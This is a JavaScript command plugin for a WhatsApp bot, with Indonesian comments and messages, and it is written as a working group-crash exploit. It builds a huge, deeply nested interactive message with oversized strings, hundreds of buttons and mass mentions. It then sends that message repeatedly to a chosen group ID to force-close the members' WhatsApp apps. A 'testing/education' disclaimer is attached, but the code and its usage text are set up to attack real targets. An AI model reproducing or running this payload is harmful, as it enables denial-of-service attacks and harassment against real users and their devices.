/**
 * PLUGIN: CRASH GROUP - ULTIMATE WORKING
 * ⚠️ WARNING: ILEGAL! Hanya untuk testing/edukasi
 * 
 * Berdasarkan CVE-2026-62196 (8.3 HIGH)
 * Payload: InteractiveMessage + ViewOnceMessage + Overflow
 */

const pluginConfig = {
    name: 'crashgroup',
    alias: ['cg', 'crashg', 'grupcrash'],
    category: 'owner',
    description: '⚠️ WhatsApp Group Crash Exploit (CVE-2026-62196)',
    usage: '.cg <group_id> [count]',
    example: '.cg 62857xxxxxxx-123456@g.us 5',
    isOwner: true,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 60,
    energi: 10,
    isEnabled: true
}

// ─── CRASH PAYLOAD ULTIMATE ──────────────────────────────────
function getUltimateCrashPayload() {
    const payload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "⚠️".repeat(20000)
                    },
                    footer: {
                        text: "\u0000\uFFFF".repeat(10000)
                    },
                    header: {
                        title: "".repeat(100000),
                        hasMediaAttachment: false
                    },
                    nativeFlowMessage: {
                        buttons: Array(200).fill(null).map(() => ({
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                displayText: "".repeat(20000),
                                url: "https://" + "a".repeat(20000) + ".com"
                            })
                        })),
                        messageParamsJson: JSON.stringify({
                            a: { b: { c: { d: { e: { f: { g: { h: { i: { j: { k: { l: { m: { n: { o: { p: { q: { r: { s: { t: { u: { v: { w: { x: { y: { z: "".repeat(200000) } } } } } } } } } } } } } } } } } } } } } } } } }
                        })
                    },
                    contextInfo: {
                        stanzaId: "".repeat(20000),
                        participant: "".repeat(20000),
                        quotedMessage: {
                            conversation: "".repeat(200000),
                            imageMessage: {
                                caption: "".repeat(100000),
                                jpegThumbnail: "".repeat(100000)
                            }
                        },
                        mentionedJid: Array(500).fill(null).map((_, i) => `${i}@s.whatsapp.net`)
                    }
                }
            }
        }
    }
    return payload
}

// ─── SEND MESSAGE UNIVERSAL ──────────────────────────────────
async function sendMessageUniversal(sock, target, payload) {
    try {
        if (typeof sock.sendMessage === 'function') {
            return await sock.sendMessage(target, payload)
        }
        if (sock.chat && typeof sock.chat.sendMessage === 'function') {
            return await sock.chat.sendMessage(target, payload)
        }
        if (sock.sendMessage && typeof sock.sendMessage === 'function') {
            return await sock.sendMessage(target, payload)
        }
        throw new Error('Tidak ada method sendMessage!')
    } catch (error) {
        throw error
    }
}

// ─── SLEEP ─────────────────────────────────────────────────────
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

// ─── EXECUTE CRASH ────────────────────────────────────────────
async function executeCrash(sock, groupId, count = 5) {
    try {
        if (!groupId) throw new Error('Group ID tidak boleh kosong!')
        if (!sock) throw new Error('Sock tidak tersedia!')

        let target = groupId
        if (!target.includes('@g.us') && /^[0-9]+$/.test(target)) {
            target = `${target}@g.us`
        }

        const results = []
        const start = Date.now()

        console.log(`[crashgroup] 🔥 Target: ${target}`)
        console.log(`[crashgroup] 📊 Count: ${count}x`)

        for (let i = 0; i < count; i++) {
            try {
                const payload = getUltimateCrashPayload()
                await sendMessageUniversal(sock, target, payload)
                
                results.push({ success: true, attempt: i + 1 })
                console.log(`[crashgroup] ✅ ${i+1}/${count} sent`)

                await sleep(300 + Math.random() * 500)

            } catch (err) {
                console.error(`[crashgroup] ❌ ${i+1}/${count}:`, err.message)
                results.push({ success: false, attempt: i + 1, error: err.message })
            }
        }

        const elapsed = ((Date.now() - start) / 1000).toFixed(1)
        const success = results.filter(r => r.success).length
        const failed = results.filter(r => !r.success).length

        return { success: success > 0, target, count, success, failed, elapsed, results }

    } catch (error) {
        return { success: false, error: error.message }
    }
}

// ─── HANDLER ──────────────────────────────────────────────────
async function handler(m, { sock }) {
    try {
        if (!sock) {
            return m.reply('❌ Sock tidak tersedia!')
        }

        const args = m.args || []
        const prefix = m.prefix || '.'
        const target = args[0]?.trim()
        const count = parseInt(args[1]) || 5

        if (!target) {
            return m.reply(
                `💀 *CRASH GROUP - ULTIMATE*\n\n` +
                `⚠️ *ILEGAL!* Hanya untuk testing/edukasi.\n\n` +
                `*Usage:*\n` +
                `${prefix}crashgroup <group_id> [count]\n\n` +
                `*Contoh:*\n` +
                `${prefix}crashgroup 62857xxxxxxx-123456@g.us 5\n\n` +
                `*Payload:* CVE-2026-62196 (8.3 HIGH)\n` +
                `*Efek:* WhatsApp target CRASH / FORCE CLOSE`
            )
        }

        const finalCount = Math.min(Math.max(count, 1), 20)

        await m.react('⏳')
        await m.reply(`💀 *MENGIRIM CRASH PAYLOAD!*\n\n📌 Target: ${target}\n📊 Count: ${finalCount}x`)

        const result = await executeCrash(sock, target, finalCount)

        if (result.success) {
            await m.react('✅')
            return m.reply(
                `📊 *HASIL CRASH*\n\n` +
                `📌 Target: ${result.target}\n` +
                `✅ Berhasil: ${result.success}/${result.count}\n` +
                `❌ Gagal: ${result.failed}/${result.count}\n` +
                `⏱️ Waktu: ${result.elapsed}s\n\n` +
                `⚠️ *Gunakan dengan bijak!*`
            )
        } else {
            await m.react('❌')
            return m.reply(`❌ Gagal: ${result.error}`)
        }

    } catch (error) {
        console.error('[crashgroup] ERROR:', error.message)
        await m.react('❌')
        return m.reply(`❌ Error: ${error.message?.slice(0, 200)}`)
    }
}

export { pluginConfig as config, handler }